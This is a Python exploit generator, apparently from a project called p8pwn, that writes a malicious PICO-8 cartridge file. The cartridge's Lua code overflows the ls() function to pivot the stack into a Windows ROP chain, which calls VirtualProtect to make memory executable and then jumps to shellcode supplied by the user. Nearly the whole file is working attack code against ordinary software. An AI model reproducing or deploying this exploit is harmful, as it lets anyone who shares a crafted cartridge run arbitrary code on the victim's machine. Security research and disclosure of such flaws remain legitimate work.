import sys


if len(sys.argv) != 3:
    print("Usage: python3 gen_exploit.py <output file> <shellcode file>")
    exit(-1)

rop = b''

### move address of VirtualProtect() setup and call into ecx
# pop eax ; ret
rop += b'\x73\x0f\xa1\x6c'
#rop += b'\x4f\x47\xb5\x39' # &mark_section_writable
rop += b'\x8a\x46\xb5\x39'
# xor eax, 0x39ffffff ; ret
rop += b'\xc7\x45\x96\x6c'
# xchg ecx, eax ; ret
rop += b'\x9b\x3e\x95\x6c'

### move 0x1000 (length for VirtualProtect()) into edx
# pop eax ; ret
rop += b'\x73\x0f\xa1\x6c'
rop += b'\xff\xef\xff\x39'
# xor eax, 0x39ffffff ; ret
rop += b'\xc7\x45\x96\x6c'
# xchg edx, eax ; ret
rop += b'\x46\x20\x94\x6c'

### (&rop_buffer - 4) -> ebx (lpflOldProtect)
# pop eax ; ret
rop += b'\x73\x0f\xa1\x6c'
rop += b'\x02\x6f\xaa\x39'
# xor eax, 0x39ffffff ; ret
rop += b'\xc7\x45\x96\x6c'
# xchg ebx, eax ; ret
rop += b'\xd0\x22\x9a\x6c'

### &rop_buffer (page-aligned, rounded down) -> eax
# pop eax ; ret
rop += b'\x73\x0f\xa1\x6c'
rop += b'\xff\x6f\xaa\x39'
# xor eax, 0x39ffffff ; ret
rop += b'\xc7\x45\x96\x6c'

### jump to VirtualProtect()
# jmp ecx
rop += b'\x81\x70\x94\x6c'

# padding for return from mark_section_writable()
rop += b'Z' * 60

### &shellcode -> eax
# pop eax ; ret
rop += b'\x73\x0f\xa1\x6c'
rop += b'BBBB'
# xor eax, 0x39ffffff ; ret
rop += b'\xc7\x45\x96\x6c'

### jump to shellcode!
# jmp eax
rop += b'\x7a\x71\x94\x6c'

sc_addr = (0x00559101 + len(rop)) ^ 0x39ffffff
sc_addr_b = sc_addr.to_bytes(4, byteorder='little')
rop = rop.replace(b'BBBB', sc_addr_b)

# load shellcode from binary
shellcode = b''
with open(sys.argv[2], 'rb') as f:
    shellcode = f.read()

p8data = b'''pico-8 cartridge // http://www.pico-8.com
version 42
__lua__
-- '''

p8data += rop + shellcode + b'\n'

p8data += b'''
-- p8pwn
-- github.com/joshiemoore/p8pwn

-- no string.rep in p8 lua :(
function srep(c, n)
  if n < 1 then return "" end
  r = ""
  for _ = 1, n do r = r..c end
  return r
end


-- padding
pwn = ""
for i = 1, 4 do
  pwn = pwn..srep("\\x41", 254)
  pwn = pwn.."/"
end
pwn = pwn..srep("\\x41", 30)
pwn = pwn.."/"

-- rop stage 1
-- teleport esp to our buffer
-- pop esp ; ret
pwn = pwn.."\\xf9\\x73\\x94\\x6c"
pwn = pwn.."\\x01\\x91\\x55\\x00"

-- just listin' files, officer
ls(pwn)
'''

with open(sys.argv[1], 'wb') as f:
    f.write(p8data)